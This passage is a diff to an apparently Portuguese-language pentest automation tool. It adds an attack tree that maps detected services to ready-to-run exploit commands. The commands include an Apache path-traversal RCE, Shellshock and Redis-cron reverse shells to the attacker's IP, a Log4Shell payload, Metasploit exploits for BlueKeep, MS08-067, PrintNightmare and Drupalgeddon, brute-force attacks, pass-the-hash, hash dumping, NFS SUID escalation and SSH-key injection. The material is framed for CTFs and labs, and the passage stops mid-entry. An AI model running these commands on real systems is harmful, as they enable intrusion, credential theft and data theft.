@@ -180,6 +180,33 @@ TOOL_DEFINITIONS = {
             "cmd": "feroxbuster -u {url} -w {wordlist} -x {ext} -d {depth} -o {output}",
         },
         {
+            "name": "ffuf",
+            "desc": "Fuzzing rápido de directorias, parâmetros e vhosts",
+            "hints": [
+                "💡 FFUF é o fuzzer mais rápido — ideal para CTFs e labs",
+                "💡 Usa FUZZ como placeholder na URL onde queres fazer fuzzing",
+                "💡 Exemplo directorias: http://alvo/FUZZ",
+                "💡 Exemplo parâmetros: http://alvo/page.php?id=FUZZ",
+                "💡 Exemplo vhosts: usa -H 'Host: FUZZ.dominio.com' com -w subdomains.txt",
+                "💡 -fc 404 filtra respostas 404 (não encontrado)",
+                "💡 -fc 403,404 filtra múltiplos códigos",
+                "💡 -mc 200 mostra só respostas 200 (OK)",
+                "💡 -t 50 define 50 threads (mais rápido, mais ruído)",
+                "💡 Wordlists recomendadas:",
+                "     /usr/share/wordlists/dirb/common.txt  (rápida)",
+                "     /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt (completa)",
+            ],
+            "params": [
+                {"key": "url",      "label": "URL com FUZZ (ex: http://192.168.1.1/FUZZ)", "default": "http://{TARGET}/FUZZ"},
+                {"key": "wordlist", "label": "Wordlist",                                    "default": "/usr/share/wordlists/dirb/common.txt"},
+                {"key": "ext",      "label": "Extensões (ex: php,html,txt — ENTER para saltar)", "default": ""},
+                {"key": "fc",       "label": "Filtrar códigos HTTP (ex: 404 ou 403,404)",   "default": "404"},
+                {"key": "threads",  "label": "Threads (velocidade)",                         "default": "40"},
+                {"key": "output",   "label": "Ficheiro output",                              "default": "ffuf_{TARGET}.txt"},
+            ],
+            "cmd": "ffuf -u {url} -w {wordlist} -e {ext} -fc {fc} -t {threads} -o {output}",
+        },
+        {
             "name": "dirb",
             "desc": "Enumeração de directorias web",
             "params": [
@@ -1319,6 +1346,22 @@ ATTACK_TREE = {
                 "hints": "Mais lento mas encontra mais — usa após gobuster falhar"
             },
             {
+                "name": "FFUF — fuzzing rápido",
+                "desc": "Fuzzer ultra-rápido — directorias, parâmetros ou vhosts",
+                "params": [
+                    {"key": "url",      "label": "URL com FUZZ (ex: http://alvo/FUZZ)", "default": "http://{TARGET}/FUZZ"},
+                    {"key": "wordlist", "label": "Wordlist",                             "default": "/usr/share/wordlists/dirb/common.txt"},
+                    {"key": "fc",       "label": "Filtrar códigos (ex: 404)",            "default": "404"},
+                    {"key": "threads",  "label": "Threads",                              "default": "40"},
+                ],
+                "cmd": "ffuf -u {url} -w {wordlist} -fc {fc} -t {threads}",
+                "followup": {
+                    "success": ["web_analyse_dirs"],
+                    "fail":    ["web_sqli"]
+                },
+                "hints": "Coloca FUZZ onde queres fazer fuzzing:\n   Directorias: http://alvo/FUZZ\n   Parâmetros: http://alvo/page.php?id=FUZZ\n   -fc 404 filtra not found | -mc 200 mostra só OK"
+            },
+            {
                 "name": "WPScan — WordPress",
                 "desc": "Detectar WordPress e enumerar users/plugins vulneráveis",
                 "params": [
@@ -1673,6 +1716,917 @@ ATTACK_TREE = {
         ]
     },
 
+
+    # ── Apache / Tomcat ──────────────────────────────────────
+    "apache": {
+        "label": "Apache / Tomcat",
+        "color": "red",
+        "icon": "🪶",
+        "detect": lambda ports, banners: any(p in ports for p in ["80","443","8080","8443","8009"]) and
+            any(s in banners for s in ["apache","tomcat","httpd"]),
+        "attacks": [
+            {
+                "name": "Apache 2.4.49/2.4.50 Path Traversal (CVE-2021-41773)",
+                "desc": "RCE/LFI crítico no Apache 2.4.49 e 2.4.50",
+                "params": [
+                    {"key": "alvo", "label": "IP alvo", "default": "{TARGET}"},
+                    {"key": "porto", "label": "Porto", "default": "80"},
+                ],
+                "cmd": "curl http://{alvo}:{porto}/cgi-bin/.%2e/.%2e/.%2e/.%2e/bin/sh --data 'echo Content-Type: text/plain; echo; id'",
+                "followup": {"success": ["privesc_tree"], "fail": ["apache_struts"]},
+                "hints": "Se funcionar tens RCE directo. Tenta depois reverse shell:\ncurl ... --data 'echo Content-Type: text/plain; echo; bash -i >& /dev/tcp/TUA_IP/4444 0>&1'"
+            },
+            {
+                "name": "Apache Struts RCE (CVE-2017-5638)",
+                "desc": "RCE via Content-Type header malicioso",
+                "params": [
+                    {"key": "alvo", "label": "URL alvo", "default": "http://{TARGET}"},
+                    {"key": "lhost", "label": "Teu IP", "default": ""},
+                    {"key": "lport", "label": "Porta", "default": "4444"},
+                ],
+                "cmd": "msfconsole -q -x 'use exploit/multi/http/struts2_content_type_ognl; set RHOSTS {alvo}; set LHOST {lhost}; set LPORT {lport}; run'",
+                "followup": {"success": ["privesc_tree"], "fail": ["tomcat_manager"]},
+                "hints": "Afectou o incidente da Equifax em 2017. Muito comum em CTFs."
+            },
+            {
+                "name": "Tomcat Manager — upload WAR shell",
+                "desc": "Fazer deploy de shell via Tomcat Manager (credenciais fracas)",
+                "params": [
+                    {"key": "alvo",  "label": "IP alvo",       "default": "{TARGET}"},
+                    {"key": "porto", "label": "Porto Tomcat",  "default": "8080"},
+                    {"key": "user",  "label": "Utilizador",    "default": "tomcat"},
+                    {"key": "pass_", "label": "Password",      "default": "tomcat"},
+                    {"key": "lhost", "label": "Teu IP",        "default": ""},
+                    {"key": "lport", "label": "Porta listener","default": "4444"},
+                ],
+                "cmd": "msfconsole -q -x 'use exploit/multi/http/tomcat_mgr_upload; set RHOSTS {alvo}; set RPORT {porto}; set HttpUsername {user}; set HttpPassword {pass_}; set LHOST {lhost}; set LPORT {lport}; run'",
+                "followup": {"success": ["privesc_tree"], "fail": ["tomcat_brute"]},
+                "hints": "Credenciais padrão: tomcat:tomcat, admin:admin, manager:manager\nPrimeiro verifica /manager/html no browser"
+            },
+            {
+                "name": "Tomcat Manager — brute force credenciais",
+                "desc": "Força bruta ao painel Tomcat Manager",
+                "params": [
+                    {"key": "alvo",  "label": "IP alvo",      "default": "{TARGET}"},
+                    {"key": "porto", "label": "Porto",         "default": "8080"},
+                ],
+                "cmd": "msfconsole -q -x 'use auxiliary/scanner/http/tomcat_mgr_login; set RHOSTS {alvo}; set RPORT {porto}; run'",
+                "followup": {"success": ["tomcat_war_shell"], "fail": ["apache_shellshock"]},
+                "hints": "Também podes tentar manualmente: admin:admin, tomcat:s3cret, both:tomcat"
+            },
+            {
+                "name": "Shellshock (CVE-2014-6271)",
+                "desc": "RCE via Bash em CGI — Apache/DHCP/SSH",
+                "params": [
+                    {"key": "alvo",  "label": "IP alvo",  "default": "{TARGET}"},
+                    {"key": "porto", "label": "Porto",     "default": "80"},
+                    {"key": "lhost", "label": "Teu IP",   "default": ""},
+                    {"key": "lport", "label": "Porta",    "default": "4444"},
+                ],
+                "cmd": "curl -H 'User-Agent: () {{ :; }}; /bin/bash -i >& /dev/tcp/{lhost}/{lport} 0>&1' http://{alvo}:{porto}/cgi-bin/test.cgi",
+                "followup": {"success": ["privesc_tree"], "fail": []},
+                "hints": "Testa primeiro sem reverse shell:\ncurl -H 'User-Agent: () { :; }; echo; /bin/id' http://{alvo}/cgi-bin/test.cgi\nTambém tenta: /cgi-bin/status, /cgi-bin/admin.cgi"
+            },
+            {
+                "name": "Heartbleed (CVE-2014-0160)",
+                "desc": "Leitura de memória via OpenSSL — porta 443",
+                "params": [
+                    {"key": "alvo", "label": "IP alvo", "default": "{TARGET}"},
+                ],
+                "cmd": "msfconsole -q -x 'use auxiliary/scanner/ssl/openssl_heartbleed; set RHOSTS {alvo}; set VERBOSE true; run'",
+                "followup": {"success": [], "fail": []},
+                "hints": "Verifica primeiro: nmap -p 443 --script ssl-heartbleed {alvo}\nPode expor chaves privadas, passwords e sessões em memória"
+            },
+            {
+                "name": "Log4Shell (CVE-2021-44228)",
+                "desc": "RCE crítico via Log4j — CVSS 10.0",
+                "params": [
+                    {"key": "alvo",  "label": "URL alvo",    "default": "http://{TARGET}"},
+                    {"key": "lhost", "label": "Teu IP",      "default": ""},
+                    {"key": "lport", "label": "Porta LDAP",  "default": "1389"},
+                ],
+                "cmd": "msfconsole -q -x 'use exploit/multi/misc/log4shell_header_injection; set RHOSTS {alvo}; set LHOST {lhost}; set LPORT {lport}; run'",
+                "followup": {"success": ["privesc_tree"], "fail": []},
+                "hints": "Payload manual: ${jndi:ldap://{lhost}:{lport}/a}\nInjectar em: User-Agent, X-Forwarded-For, username, email"
+            },
+        ]
+    },
+
+    # ── WordPress ─────────────────────────────────────────────
+    "wordpress": {
+        "label": "WordPress",
+        "color": "bright_blue",
+        "icon": "📝",
+        "detect": lambda ports, banners: "wordpress" in banners or "wp-content" in banners or "wp-login" in banners,
+        "attacks": [
+            {
+                "name": "WPScan — enumeração completa",
+                "desc": "Descobrir utilizadores, plugins e temas vulneráveis",
+                "params": [
+                    {"key": "url",  "label": "URL WordPress", "default": "http://{TARGET}"},
+                    {"key": "token","label": "WPScan API token (ENTER para saltar)", "default": ""},
+                ],
+                "cmd": "wpscan --url {url} -e u,vp,vt,ap --plugins-detection aggressive",
+                "followup": {"success": ["wp_brute_users", "wp_exploit_plugin"], "fail": []},
+                "hints": "Regista em wpscan.io para API token gratuito — dá mais CVEs"
+            },
+            {
+                "name": "WPScan — brute force admin",
+                "desc": "Força bruta ao wp-login.php com users encontrados",
+                "params": [
+                    {"key": "url",      "label": "URL WordPress",    "default": "http://{TARGET}"},
+                    {"key": "users",    "label": "User ou ficheiro", "default": "admin"},
+                    {"key": "wordlist", "label": "Wordlist",         "default": "/usr/share/wordlists/rockyou.txt"},
+                ],
+                "cmd": "wpscan --url {url} -U {users} -P {wordlist} --password-attack wp-login",
+                "followup": {"success": ["wp_shell_upload"], "fail": ["wp_xmlrpc"]},
+                "hints": "Users comuns WordPress: admin, administrator, wp-admin, editor"
+            },
+            {
+                "name": "WordPress XML-RPC brute force",
+                "desc": "Brute force via xmlrpc.php (bypassa rate limiting)",
+                "params": [
+                    {"key": "url",      "label": "URL WordPress",    "default": "http://{TARGET}"},
+                    {"key": "user",     "label": "Utilizador",       "default": "admin"},
+                    {"key": "wordlist", "label": "Wordlist",         "default": "/usr/share/wordlists/rockyou.txt"},
+                ],
+                "cmd": "wpscan --url {url} -U {user} -P {wordlist} --password-attack xmlrpc-multicall",
+                "followup": {"success": ["wp_shell_upload"], "fail": ["wp_plugin_exploit"]},
+                "hints": "xmlrpc permite múltiplos logins por request — muito mais rápido"
+            },
+            {
+                "name": "WordPress — shell via theme editor",
+                "desc": "Após login admin — injectar shell PHP no tema",
+                "params": [
+                    {"key": "url",   "label": "URL WordPress",  "default": "http://{TARGET}"},
+                    {"key": "lhost", "label": "Teu IP",         "default": ""},
+                    {"key": "lport", "label": "Porta listener", "default": "4444"},
+                ],
+                "cmd": "msfconsole -q -x 'use exploit/unix/webapp/wp_admin_shell_upload; set RHOSTS {url}; set LHOST {lhost}; set LPORT {lport}; run'",
+                "followup": {"success": ["privesc_tree"], "fail": []},
+                "hints": "Precisa de credenciais admin. Após acesso vai a:\nAppearance > Theme Editor > 404.php e cola a shell"
+            },
+            {
+                "name": "WordPress Plugin — File Manager RCE",
+                "desc": "CVE-2020-25213 — plugin File Manager < 6.9",
+                "params": [
+                    {"key": "alvo",  "label": "IP alvo",        "default": "{TARGET}"},
+                    {"key": "lhost", "label": "Teu IP",         "default": ""},
+                    {"key": "lport", "label": "Porta listener", "default": "4444"},
+                ],
+                "cmd": "msfconsole -q -x 'use exploit/multi/http/wp_file_manager_rce; set RHOSTS {alvo}; set LHOST {lhost}; set LPORT {lport}; run'",
+                "followup": {"success": ["privesc_tree"], "fail": ["wp_brute"]},
+                "hints": "Um dos exploits WordPress mais explorados em 2020. Sem autenticação necessária."
+            },
+        ]
+    },
+
+    # ── Drupal ────────────────────────────────────────────────
+    "drupal": {
+        "label": "Drupal",
+        "color": "blue",
+        "icon": "💧",
+        "detect": lambda ports, banners: "drupal" in banners or "sites/default" in banners,
+        "attacks": [
+            {
+                "name": "Drupalgeddon2 (CVE-2018-7600)",
+                "desc": "RCE sem autenticação — Drupal < 7.58 / 8.x < 8.3.9",
+                "params": [
+                    {"key": "alvo",  "label": "IP alvo",        "default": "{TARGET}"},
+                    {"key": "lhost", "label": "Teu IP",         "default": ""},
+                    {"key": "lport", "label": "Porta listener", "default": "4444"},
+                ],
+                "cmd": "msfconsole -q -x 'use exploit/unix/webapp/drupal_drupalgeddon2; set RHOSTS {alvo}; set LHOST {lhost}; set LPORT {lport}; run'",
+                "followup": {"success": ["privesc_tree"], "fail": ["drupal_geddon3"]},
+                "hints": "Um dos exploits mais comuns em CTFs. Verifica versão em /CHANGELOG.txt"
+            },
+            {
+                "name": "Drupalgeddon3 (CVE-2018-7602)",
+                "desc": "RCE autenticado — Drupal 7.x e 8.x",
+                "params": [
+                    {"key": "alvo",  "label": "IP alvo",        "default": "{TARGET}"},
+                    {"key": "lhost", "label": "Teu IP",         "default": ""},
+                    {"key": "lport", "label": "Porta listener", "default": "4444"},
+                ],
+                "cmd": "msfconsole -q -x 'use exploit/unix/webapp/drupal_drupalgeddon3; set RHOSTS {alvo}; set LHOST {lhost}; set LPORT {lport}; run'",
+                "followup": {"success": ["privesc_tree"], "fail": []},
+                "hints": "Precisa de sessão autenticada. Tenta credenciais padrão: admin:admin"
+            },
+            {
+                "name": "Drupal — OpenID brute force",
+                "desc": "Força bruta ao painel admin Drupal",
+                "params": [
+                    {"key": "alvo",     "label": "IP alvo",    "default": "{TARGET}"},
+                    {"key": "wordlist", "label": "Wordlist",   "default": "/usr/share/wordlists/rockyou.txt"},
+                ],
+                "cmd": "msfconsole -q -x 'use auxiliary/scanner/http/drupal_login; set RHOSTS {alvo}; set PASS_FILE {wordlist}; run'",
+                "followup": {"success": ["drupal_geddon3"], "fail": []},
+                "hints": "User padrão: admin. Verifica também /user/login"
+            },
+        ]
+    },
+
+    # ── RDP ───────────────────────────────────────────────────
+    "rdp": {
+        "label": "RDP (Remote Desktop)",
+        "color": "cyan",
+        "icon": "🖥️",
+        "detect": lambda ports, banners: "3389" in ports or "rdp" in banners or "ms-wbt-server" in banners,
+        "attacks": [
+            {
+                "name": "BlueKeep (CVE-2019-0708)",
+                "desc": "RCE sem autenticação RDP — Windows 7/2008",
+                "params": [
+                    {"key": "alvo",  "label": "IP alvo",        "default": "{TARGET}"},
+                    {"key": "lhost", "label": "Teu IP",         "default": ""},
+                    {"key": "lport", "label": "Porta listener", "default": "4444"},
+                ],
+                "cmd": "msfconsole -q -x 'use exploit/windows/rdp/cve_2019_0708_bluekeep_rce; set RHOSTS {alvo}; set LHOST {lhost}; set LPORT {lport}; run'",
+                "followup": {"success": ["privesc_tree"], "fail": ["rdp_brute"]},
+                "hints": "Verifica primeiro: nmap -p 3389 --script rdp-vuln-ms12-020 {alvo}\nPode causar BSOD — usar com cuidado em ambientes reais"
+            },
+            {
+                "name": "DejaBlue (CVE-2019-1181/1182)",
+                "desc": "RCE RDP — Windows 8/10/2012/2019",
+                "params": [
+                    {"key": "alvo",  "label": "IP alvo",        "default": "{TARGET}"},
+                    {"key": "lhost", "label": "Teu IP",         "default": ""},
+                    {"key": "lport", "label": "Porta listener", "default": "4444"},
+                ],
+                "cmd": "msfconsole -q -x 'use exploit/windows/rdp/cve_2019_1181_dejablue; set RHOSTS {alvo}; set LHOST {lhost}; set LPORT {lport}; run'",
+                "followup": {"success": ["privesc_tree"], "fail": ["rdp_brute"]},
+                "hints": "Versão mais recente que BlueKeep — afecta sistemas mais modernos"
+            },
+            {
+                "name": "RDP Brute force (hydra)",
+                "desc": "Força bruta às credenciais RDP",
+                "params": [
+                    {"key": "alvo",     "label": "IP alvo",    "default": "{TARGET}"},
+                    {"key": "user",     "label": "Utilizador", "default": "Administrator"},
+                    {"key": "wordlist", "label": "Wordlist",   "default": "/usr/share/wordlists/rockyou.txt"},
+                ],
+                "cmd": "hydra -l {user} -P {wordlist} rdp://{alvo}",
+                "followup": {"success": ["rdp_login"], "fail": []},
+                "hints": "Users comuns Windows: Administrator, admin, Guest, user\nTambém tenta: ncrack -p 3389 --user Administrator -P rockyou.txt {alvo}"
+            },
+            {
+                "name": "RDP login com credenciais",
+                "desc": "Ligar via RDP com credenciais obtidas",
+                "params": [
+                    {"key": "alvo", "label": "IP alvo",    "default": "{TARGET}"},
+                    {"key": "user", "label": "Utilizador", "default": "Administrator"},
+                ],
+                "cmd": "xfreerdp /u:{user} /v:{alvo} /dynamic-resolution +clipboard",
+                "followup": {"success": ["privesc_tree"], "fail": []},
+                "hints": "Vai pedir password interactivamente. Adiciona /p:PASSWORD para automatizar."
+            },
+        ]
+    },
+
+    # ── Samba / NFS ───────────────────────────────────────────
+    "nfs": {
+        "label": "NFS / Rpcbind",
+        "color": "magenta",
+        "icon": "📂",
+        "detect": lambda ports, banners: any(p in ports for p in ["111","2049"]) or "nfs" in banners or "rpcbind" in banners,
+        "attacks": [
+            {
+                "name": "NFS — listar exports",
+                "desc": "Ver partilhas NFS disponíveis sem autenticação",
+                "params": [
+                    {"key": "alvo", "label": "IP alvo", "default": "{TARGET}"},
+                ],
+                "cmd": "showmount -e {alvo}",
+                "followup": {"success": ["nfs_mount"], "fail": []},
+                "hints": "Se mostrar / ou /home — montas e tens acesso ao filesystem"
+            },
+            {
+                "name": "NFS — montar partilha",
+                "desc": "Montar directoria NFS localmente",
+                "params": [
+                    {"key": "alvo",   "label": "IP alvo",             "default": "{TARGET}"},
+                    {"key": "share",  "label": "Partilha (ex: /home)","default": "/"},
+                    {"key": "mount",  "label": "Ponto de montagem",   "default": "/mnt/nfs"},
+                ],
+                "cmd": "mkdir -p {mount} && mount -t nfs {alvo}:{share} {mount} && ls -la {mount}",
+                "followup": {"success": ["nfs_privesc"], "fail": []},
+                "hints": "Se tiveres acesso a /root ou /home/<user>/.ssh podes copiar chaves SSH\ncp {mount}/root/.ssh/id_rsa . && chmod 600 id_rsa && ssh -i id_rsa root@{alvo}"
+            },
+            {
+                "name": "NFS — escalada via UID spoofing",
+                "desc": "Criar utilizador local com UID do alvo para acesso root NFS",
+                "params": [
+                    {"key": "uid",   "label": "UID do utilizador alvo (ex: 1000)", "default": "0"},
+                    {"key": "mount", "label": "Ponto de montagem NFS",             "default": "/mnt/nfs"},
+                ],
+                "cmd": "useradd -u {uid} pwned 2>/dev/null; su pwned -c 'ls -la {mount}'",
+                "followup": {"success": ["privesc_tree"], "fail": []},
+                "hints": "NFS com no_root_squash permite escrever com UID 0:\ncp /bin/bash {mount}/bash && chmod +s {mount}/bash\n{mount}/bash -p"
+            },
+        ]
+    },
+
+    # ── Serviços Windows ──────────────────────────────────────
+    "windows": {
+        "label": "Windows / Active Directory",
+        "color": "bright_blue",
+        "icon": "🪟",
+        "detect": lambda ports, banners: any(p in ports for p in ["135","139","445","3389","5985","5986","88"]) or
+            any(s in banners for s in ["windows","microsoft","iis","active directory","kerberos"]),
+        "attacks": [
+            {
+                "name": "MS08-067 (CVE-2008-4250)",
+                "desc": "RCE clássico — Windows XP/2003/Vista/2008",
+                "params": [
+                    {"key": "alvo",  "label": "IP alvo",        "default": "{TARGET}"},
+                    {"key": "lhost", "label": "Teu IP",         "default": ""},
+                    {"key": "lport", "label": "Porta listener", "default": "4444"},
+                ],
+                "cmd": "msfconsole -q -x 'use exploit/windows/smb/ms08_067_netapi; set RHOSTS {alvo}; set LHOST {lhost}; set LPORT {lport}; run'",
+                "followup": {"success": ["dump_hashes", "privesc_tree"], "fail": ["ms17_010"]},
+                "hints": "Clássico do Metasploit. Muito comum em HTB/CTFs com máquinas antigas."
+            },
+            {
+                "name": "PrintNightmare (CVE-2021-34527)",
+                "desc": "RCE/LPE via Windows Print Spooler",
+                "params": [
+                    {"key": "alvo",  "label": "IP alvo",        "default": "{TARGET}"},
+                    {"key": "lhost", "label": "Teu IP",         "default": ""},
+                    {"key": "lport", "label": "Porta listener", "default": "4444"},
+                ],
+                "cmd": "msfconsole -q -x 'use exploit/windows/dcerpc/cve_2021_1675_printnightmare; set RHOSTS {alvo}; set LHOST {lhost}; set LPORT {lport}; run'",
+                "followup": {"success": ["dump_hashes"], "fail": ["windows_winrm"]},
+                "hints": "Afecta praticamente todos os Windows com Print Spooler activo"
+            },
+            {
+                "name": "WinRM — acesso remoto PowerShell",
+                "desc": "Ligar via WinRM com credenciais (porta 5985)",
+                "params": [
+                    {"key": "alvo", "label": "IP alvo",    "default": "{TARGET}"},
+                    {"key": "user", "label": "Utilizador", "default": "Administrator"},
+                    {"key": "pass_","label": "Password",   "default": ""},
+                ],
+                "cmd": "evil-winrm -i {alvo} -u {user} -p {pass_}",
+                "followup": {"success": ["privesc_tree", "dump_hashes"], "fail": ["windows_ms08"]},
+                "hints": "evil-winrm já vem no Kali. Muito útil após obter credenciais Windows."
+            },
+            {
+                "name": "Pass-the-Hash (PTH)",
+                "desc": "Autenticar com hash NTLM sem crackear",
+                "params": [
+                    {"key": "alvo",  "label": "IP alvo",           "default": "{TARGET}"},
+                    {"key": "user",  "label": "Utilizador",        "default": "Administrator"},
+                    {"key": "hash",  "label": "Hash NTLM (LM:NTLM)","default": ""},
+                ],
+                "cmd": "pth-winexe -U {user}%{hash} //{alvo} cmd.exe",
+                "followup": {"success": ["privesc_tree"], "fail": []},
+                "hints": "Formato hash: aad3b435b51404eeaad3b435b51404ee:HASH_NTLM\nTambém funciona com evil-winrm -H HASH"
+            },
+            {
+                "name": "Kerberoasting",
+                "desc": "Extrair tickets Kerberos para crackear offline",
+                "params": [
+                    {"key": "user",  "label": "Utilizador AD",     "default": ""},
+                    {"key": "pass_", "label": "Password",          "default": ""},
+                    {"key": "dc",    "label": "IP Domain Controller","default": "{TARGET}"},
+                    {"key": "domain","label": "Domínio",           "default": ""},
+                ],
+                "cmd": "impacket-GetUserSPNs {domain}/{user}:{pass_} -dc-ip {dc} -request -outputfile kerberoast.txt",
+                "followup": {"success": ["crack_kerberos"], "fail": []},
+                "hints": "Após obter tickets:\nhashcat -m 13100 kerberoast.txt /usr/share/wordlists/rockyou.txt"
+            },
+            {
+                "name": "Secretsdump — extrair hashes SAM/NTDS",
+                "desc": "Dump de hashes locais e de domínio",
+                "params": [
+                    {"key": "user",  "label": "Utilizador",  "default": "Administrator"},
+                    {"key": "pass_", "label": "Password",    "default": ""},
+                    {"key": "alvo",  "label": "IP alvo",     "default": "{TARGET}"},
+                ],
+                "cmd": "impacket-secretsdump {user}:{pass_}@{alvo}",
+                "followup": {"success": ["crack_hashes", "pth"], "fail": []},
+                "hints": "Com hash: impacket-secretsdump -hashes LM:NT Administrator@{alvo}\nGuarda todos os hashes — crackea depois com hashcat"
+            },
+        ]
+    },
+
+    # ── SNMP ─────────────────────────────────────────────────
+    "snmp": {
+        "label": "SNMP",
+        "color": "yellow",
+        "icon": "📡",
+        "detect": lambda ports, banners: "161" in ports or "162" in ports or "snmp" in banners,
+        "attacks": [
+            {
+                "name": "SNMP community string brute force",
+                "desc": "Descobrir community strings SNMP",
+                "params": [
+                    {"key": "alvo", "label": "IP alvo", "default": "{TARGET}"},
+                ],
+                "cmd": "msfconsole -q -x 'use auxiliary/scanner/snmp/snmp_login; set RHOSTS {alvo}; run'",
+                "followup": {"success": ["snmp_enum"], "fail": []},
+                "hints": "Community strings comuns: public, private, community, manager, admin"
+            },
+            {
+                "name": "SNMPwalk — enumeração completa",
+                "desc": "Extrair toda a informação SNMP disponível",
+                "params": [
+                    {"key": "alvo",      "label": "IP alvo",          "default": "{TARGET}"},
+                    {"key": "community", "label": "Community string", "default": "public"},
+                ],
+                "cmd": "snmpwalk -v2c -c {community} {alvo} && snmpwalk -v2c -c {community} {alvo} 1.3.6.1.4.1.77.1.2.25",
+                "followup": {"success": [], "fail": []},
+                "hints": "OID 1.3.6.1.4.1.77.1.2.25 lista utilizadores Windows\nProcura: usernames, processos, software instalado, rotas de rede"
+            },
+        ]
+    },
+
+    # ── Serviços de E-mail ────────────────────────────────────
+    "mail": {
+        "label": "SMTP / POP3 / IMAP",
+        "color": "green",
+        "icon": "📧",
+        "detect": lambda ports, banners: any(p in ports for p in ["25","110","143","465","587","993","995"]) or
+            any(s in banners for s in ["smtp","pop3","imap","sendmail","postfix","dovecot"]),
+        "attacks": [
+            {
+                "name": "SMTP — enumeração de utilizadores",
+                "desc": "Descobrir utilizadores via comandos VRFY/EXPN",
+                "params": [
+                    {"key": "alvo", "label": "IP alvo", "default": "{TARGET}"},
+                ],
+                "cmd": "msfconsole -q -x 'use auxiliary/scanner/smtp/smtp_enum; set RHOSTS {alvo}; run'",
+                "followup": {"success": ["mail_brute"], "fail": []},
+                "hints": "Também manualmente: nc {alvo} 25 → VRFY root → VRFY admin"
+            },
+            {
+                "name": "SMTP Open Relay",
+                "desc": "Testar se o servidor aceita relay de e-mail externo",
+                "params": [
+                    {"key": "alvo", "label": "IP alvo", "default": "{TARGET}"},
+                ],
+                "cmd": "nmap -p 25 --script smtp-open-relay {alvo}",
+                "followup": {"success": [], "fail": ["mail_brute"]},
+                "hints": "Open relay pode ser usado para phishing ou spam — regista como vulnerabilidade"
+            },
+            {
+                "name": "POP3/IMAP brute force",
+                "desc": "Força bruta a contas de email",
+                "params": [
+                    {"key": "alvo",     "label": "IP alvo",    "default": "{TARGET}"},
+                    {"key": "proto",    "label": "Protocolo (pop3/imap)", "default": "pop3"},
+                    {"key": "user",     "label": "Utilizador", "default": "admin"},
+                    {"key": "wordlist", "label": "Wordlist",   "default": "/usr/share/wordlists/rockyou.txt"},
+                ],
+                "cmd": "hydra -l {user} -P {wordlist} {proto}://{alvo}",
+                "followup": {"success": [], "fail": []},
+                "hints": "Tenta users encontrados via SMTP enum. Credenciais podem reutilizar-se noutros serviços."
+            },
+        ]
+    },
+
+    # ── Redis ─────────────────────────────────────────────────
+    "redis": {
+        "label": "Redis",
+        "color": "red",
+        "icon": "🔴",
+        "detect": lambda ports, banners: "6379" in ports or "redis" in banners,
+        "attacks": [
+            {
+                "name": "Redis — acesso sem autenticação",
+                "desc": "Ligar ao Redis sem password e enumerar",
+                "params": [{"key": "alvo", "label": "IP alvo", "default": "{TARGET}"}],
+                "cmd": "redis-cli -h {alvo} ping && redis-cli -h {alvo} info && redis-cli -h {alvo} keys '*'",
+                "followup": {"success": ["redis_rce"], "fail": []},
+                "hints": "Se responder PONG — tens acesso total.\nProcura: keys com passwords, tokens, sessões"
+            },
+            {
+                "name": "Redis — RCE via cron job",
+                "desc": "Escrever cron job malicioso via Redis para RCE",
+                "params": [
+                    {"key": "alvo",  "label": "IP alvo",  "default": "{TARGET}"},
+                    {"key": "lhost", "label": "Teu IP",   "default": ""},
+                    {"key": "lport", "label": "Porta",    "default": "4444"},
+                ],
+                "cmd": "redis-cli -h {alvo} config set dir /var/spool/cron/ && redis-cli -h {alvo} config set dbfilename root && redis-cli -h {alvo} set payload '\n\n*/1 * * * * bash -i >& /dev/tcp/{lhost}/{lport} 0>&1\n\n' && redis-cli -h {alvo} save",
+                "followup": {"success": ["privesc_tree"], "fail": ["redis_ssh"]},
+                "hints": "Aguarda até 1 minuto pelo cron executar.\nAlternativa: escrever chave SSH authorized_keys"
+            },
+            {
+                "name": "Redis — RCE via SSH authorized_keys",
+                "desc": "Injectar chave SSH pública via Redis",
+                "params": [
+                    {"key": "alvo",   "label": "IP alvo",                    "default": "{TARGET}"},
+                    {"key": "pubkey", "label": "Tua chave pública (~/.ssh/id_rsa.pub)", "default": ""},
+                ],
+                "cmd": "redis-cli -h {alvo} config set dir /root/.ssh/ && redis-cli -h {alvo} config set dbfilename authorized_keys && redis-cli -h {alvo} set pwn '{pubkey}' && redis-cli -h {alvo} save && ssh root@{alvo}",
+                "followup": {"success": ["privesc_tree"], "fail": []},
+                "hints": "Gera chave se não tiveres: ssh-keygen -t rsa\nDepois: cat ~/.ssh/id_rsa.pub"
+            },
+        ]
+    },
+
+    # ── MongoDB ───────────────────────────────────────────────
+    "mongodb": {
+        "label": "MongoDB",
+        "color": "green",
+        "icon": "🍃",
+        "detect": lambda ports, banners: "27017" in ports or "27018" in ports or "mongodb" in banners,
+        "attacks": [
+            {
+                "name": "MongoDB — acesso sem autenticação",
+                "desc": "Ligar ao MongoDB sem credenciais",
+                "params": [{"key": "alvo", "label": "IP alvo", "default": "{TARGET}"}],
+                "cmd": "mongosh {alvo} --eval 'db.adminCommand({listDatabases:1})'",
+                "followup": {"success": ["mongodb_dump"], "fail": []},
+                "hints": "Se ligar sem erro — tens acesso.\nAlternativa antiga: mongo {alvo}"
+            },
+            {
+                "name": "MongoDB — dump de bases de dados",
+                "desc": "Extrair todas as bases de dados",
+                "params": [
+                    {"key": "alvo",   "label": "IP alvo",        "default": "{TARGET}"},
+                    {"key": "output", "label": "Pasta de output", "default": "./mongo_dump"},
+                ],
+                "cmd": "mongodump --host {alvo} --out {output} && ls {output}",
+                "followup": {"success": [], "fail": []},
+                "hints": "Procura DBs: users, admin, accounts, credentials, sessions"
+            },
+            {
+                "name": "MongoDB — nmap enum",
+                "desc": "Enumerar MongoDB via scripts NSE",
+                "params": [{"key": "alvo", "label": "IP alvo", "default": "{TARGET}"}],
+                "cmd": "nmap -p 27017 --script mongodb-info,mongodb-databases {alvo}",
+                "followup": {"success": ["mongodb_dump"], "fail": []},
+                "hints": "Mostra versão, bases de dados e configuração"
+            },
+        ]
+    },
+
+    # ── Jenkins ───────────────────────────────────────────────
+    "jenkins": {
+        "label": "Jenkins",
+        "color": "bright_red",
+        "icon": "⚙️",
+        "detect": lambda ports, banners: any(p in ports for p in ["8080","8443","50000"]) and "jenkins" in banners,
+        "attacks": [
+            {
+                "name": "Jenkins — acesso anónimo ao painel",
+                "desc": "Verificar se o Jenkins permite acesso sem login",
+                "params": [{"key": "url", "label": "URL Jenkins", "default": "http://{TARGET}:8080"}],
+                "cmd": "curl -s {url}/api/json?pretty=true | head -30",
